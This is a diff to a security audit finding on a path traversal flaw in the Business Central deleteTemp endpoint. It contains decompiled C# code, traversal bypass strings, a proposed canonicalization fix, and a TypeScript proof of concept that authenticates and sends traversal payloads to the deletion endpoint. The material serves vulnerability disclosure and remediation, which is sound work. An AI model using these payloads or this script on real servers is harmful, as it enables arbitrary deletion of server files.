@@ -304,45 +304,93 @@ session.close();
 
 ## D. Path Traversal in File Deletion
 
-**Severity:** HIGH -- authenticated arbitrary file deletion.
+**Severity:** HIGH -- authenticated arbitrary file deletion (subject to GuardedDelete implementation).
 
-**File:** `Microsoft.Dynamics.Nav.Service.ClientService/UploadDownloadController.cs:162-169`
+**File:** `Microsoft.Dynamics.Nav.Service.ClientService/UploadDownloadController.cs:150-172`
 
-**Root cause:** File deletion path constructed from user-supplied filename with inadequate sanitization:
+**Endpoint:** `DELETE /uploadDownload/deleteTemp`
+**Request body:** JSON array of filenames: `["TEMP\\file1.txt", "TEMP\\file2.txt"]`
+**Authentication:** Required (valid BC session)
+
+**Root cause:** File deletion path constructed from user-supplied filename. The only sanitization is a `TEMP\\` prefix strip that is bypassable:
 
 ```csharp
-// UploadDownloadController.cs lines 162-172
+// UploadDownloadController.cs lines 150-152 -- route definition
+[HttpDelete]
+[Route("deleteTemp")]
+public Task<List<FileDeletion>> DeleteTempFiles([FromBody] List<string> fileNames)
+
+// Lines 162-172 -- per-filename processing
 string text = fileName;
 if (text.Contains("TEMP\\", StringComparison.OrdinalIgnoreCase))
 {
-    text = text.Substring("TEMP\\".Length, text.Length - "TEMP\\".Length);
+    string text2 = text;
+    int length = "TEMP\\".Length;
+    text = text2.Substring(length, text2.Length - length);  // Strip "TEMP\" (5 chars)
 }
-NavFile.GuardedDelete(text);
+try
+{
+    NavFile.GuardedDelete(DataError.ThrowError, text, enforceUserPath: true);
 ```
 
-The `TEMP\\` prefix strip is bypassable:
-- Mixed separators: `TEMP/../../etc/passwd`
-- Case variations not fully handled
-- No verification that the resolved path stays within the temp directory
-- Relative path components (`../`) not stripped
+**Bypass vectors (confirmed from source):**
 
-**Impact:** An authenticated user could delete arbitrary files accessible to the BC service account.
+1. **Mixed separators** -- `Contains("TEMP\\")` checks for backslash only:
+   - Input: `TEMP/../../windows/system32/drivers/etc/hosts`
+   - `Contains("TEMP\\")` returns FALSE (forward slash)
+   - Full path passed directly to `GuardedDelete`
 
-**Proposed fix:** Resolve the full path, then verify it starts with the expected temp directory. Use `Path.GetFullPath()` and compare against the allowed base directory.
+2. **Traversal after strip** -- prefix is removed but `../` remains:
+   - Input: `TEMP\..\..\CustomSettings.config`
+   - After strip: `..\..\ CustomSettings.config`
+   - Relative traversal reaches parent directories
+
+3. **No `Path.GetFullPath()` resolution** -- path is not canonicalized before use
+
+4. **No directory boundary check** -- no verification that the resolved path stays within `ALSystemOperatingSystem.ALTemporaryPath`
+
+**Caveat -- NavFile.GuardedDelete():**
+
+`NavFile` is a compiled-only class (not in the decompiled source). Its `GuardedDelete` method accepts an `enforceUserPath: true` parameter. This parameter *might* provide path validation that prevents the traversal. **We cannot verify this from the decompiled source alone.**
+
+However, the controller-level sanitization is definitively inadequate:
+- The mixed-separator bypass (`TEMP/` vs `TEMP\`) is a logic error regardless of GuardedDelete's behavior
+- The lack of `Path.GetFullPath()` canonicalization is a defense-in-depth failure
+- Other file operations in BC use proper path validation (e.g., `RsaEncryptionProviderBase.cs:183` calls `Path.GetFullPath()`)
+
+**Other file operations exposed by UploadDownloadController:**
+
+| Route | Method | Purpose | Validation |
+|---|---|---|---|
+| `/uploadDownload/download` | GET | Retrieve file | Session-based stream |
+| `/uploadDownload/upload` | POST | Store file | FileTypeFilter + malware scan |
+| `/uploadDownload/uploadTemp` | POST | Store temp file | FileTypeFilter + malware scan |
+| `/uploadDownload/validate` | POST | Check file type | Extension filter only |
+| `/uploadDownload/deleteTemp` | DELETE | **Delete temp file** | **VULNERABLE -- path traversal** |
+
+**Proposed fix:**
+
+```csharp
+// Resolve to absolute path and verify it stays in temp directory
+string fullPath = Path.GetFullPath(Path.Combine(ALSystemOperatingSystem.ALTemporaryPath, text));
+string tempDir = Path.GetFullPath(ALSystemOperatingSystem.ALTemporaryPath);
+if (!fullPath.StartsWith(tempDir + Path.DirectorySeparatorChar, StringComparison.OrdinalIgnoreCase))
+{
+    throw new UnauthorizedAccessException("File path is outside temp directory");
+}
+NavFile.GuardedDelete(DataError.ThrowError, fullPath, enforceUserPath: true);
+```
 
 ### PoC
 
 ```typescript
 // poc/D-path-traversal.ts
-// Demonstrates: the file deletion endpoint accepts user-controlled filenames.
-// This PoC does NOT actually delete files -- it shows the vulnerable code path.
+// Tests the deleteTemp endpoint for path traversal handling.
+// Step 1: Creates a temp file via uploadTemp to learn the temp path format.
+// Step 2: Sends traversal payloads to deleteTemp and checks server response.
 //
-// The UploadDownloadController is an HTTP endpoint (not WebSocket), accessible
-// at POST /bc/download?tenant=...&company=...
-// The fileName parameter is in the request body.
-//
-// WARNING: Actually exploiting this could delete critical server files.
-// Only test against a disposable VM.
+// WARNING: If GuardedDelete does NOT validate paths, this WILL delete files.
+// Only run against a disposable VM. Start with a safe canary file you create.
 import { config as dotenvConfig } from 'dotenv';
 import { loadConfig } from '../src/core/config.js';
 import { NTLMAuthProvider } from '../src/connection/auth/ntlm-provider.js';
@@ -356,30 +404,64 @@ const auth = new NTLMAuthProvider({
   baseUrl: config.bc.baseUrl, username: config.bc.username,
   password: config.bc.password, tenantId: config.bc.tenantId,
 }, logger);
-const authResult = await auth.authenticate();
-unwrap(authResult);
+unwrap(await auth.authenticate());
+const cookies = auth.getWebSocketHeaders()['Cookie'];
 
-console.log('Path traversal analysis:');
+const baseUrl = config.bc.baseUrl;
+
+// Step 1: Upload a temp file to learn the path format
+console.log('Step 1: Uploading temp file to learn path format...');
+const form = new FormData();
+form.append('file', new Blob(['canary']), 'canary.txt');
+const uploadResp = await fetch(`${baseUrl}/uploadDownload/uploadTemp`, {
+  method: 'POST',
+  headers: { 'Cookie': cookies },
+  body: form,
+});
+console.log(`  Upload response: ${uploadResp.status}`);
+if (uploadResp.ok) {
+  const uploadResult = await uploadResp.text();
+  console.log(`  Returned path: ${uploadResult}`);
+  // Path format is typically: TEMP\<guid>.txt
+}
+
+// Step 2: Test traversal payloads (DRY RUN -- observe response codes only)
+const payloads = [
+  // Safe: normal temp file deletion
+  'TEMP\\nonexistent_file_12345.txt',
+  // Bypass 1: forward slash (skips Contains("TEMP\\") check)
+  'TEMP/../../nonexistent_canary_test.txt',
+  // Bypass 2: traversal after strip
+  'TEMP\\..\\..\\nonexistent_canary_test.txt',
+  // Bypass 3: no TEMP prefix at all
+  '..\\..\\nonexistent_canary_test.txt',
+];
+
 console.log('');
-console.log('Vulnerable endpoint: POST /bc/deletefile?tenant=default');
-console.log('Parameter: fileName (in request body)');
+console.log('Step 2: Testing traversal payloads (non-destructive -- targeting nonexistent files)...');
+for (const payload of payloads) {
+  const resp = await fetch(`${baseUrl}/uploadDownload/deleteTemp`, {
+    method: 'DELETE',
+    headers: {
+      'Cookie': cookies,
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify([payload]),
+  });
+  const body = await resp.text();
+  console.log(`  "${payload}"`);
+  console.log(`    Response: ${resp.status} -- ${body.substring(0, 120)}`);
+  console.log('');
+}
+
+console.log('Analysis:');
+console.log('  If all payloads return 200 with "FileNotFound" errors:');
+console.log('    -> Server attempted deletion at traversed path (GuardedDelete reached)');
+console.log('    -> Vulnerability is exploitable if target file exists');
 console.log('');
-console.log('Code path (UploadDownloadController.cs:162-172):');
-console.log('  1. fileName received from client');
-console.log('  2. if fileName.Contains("TEMP\\\\") -> strip TEMP\\\\ prefix');
-console.log('  3. NavFile.GuardedDelete(text)');
-console.log('');
-console.log('Bypass vectors:');
-console.log('  "TEMP\\\\..\\\\..\\\\..\\\\windows\\\\temp\\\\test.txt"');
-console.log('  -> after strip: "..\\\\..\\\\..\\\\windows\\\\temp\\\\test.txt"');
-console.log('  -> GuardedDelete receives traversal path');
-console.log('');
-console.log('  "TEMP/../../sensitive.config"');
-console.log('  -> Contains("TEMP\\\\") is FALSE (forward slash)');
-console.log('  -> fileName passed directly to GuardedDelete');
-console.log('');
-console.log('Mitigation depends entirely on NavFile.GuardedDelete() implementation.');
-console.log('If GuardedDelete only checks file existence, the deletion succeeds.');
+console.log('  If traversal payloads return 403 or specific path errors:');
+console.log('    -> GuardedDelete or middleware blocks the traversal');
+console.log('    -> Finding D has lower severity than assessed');
 ```
 
 ---
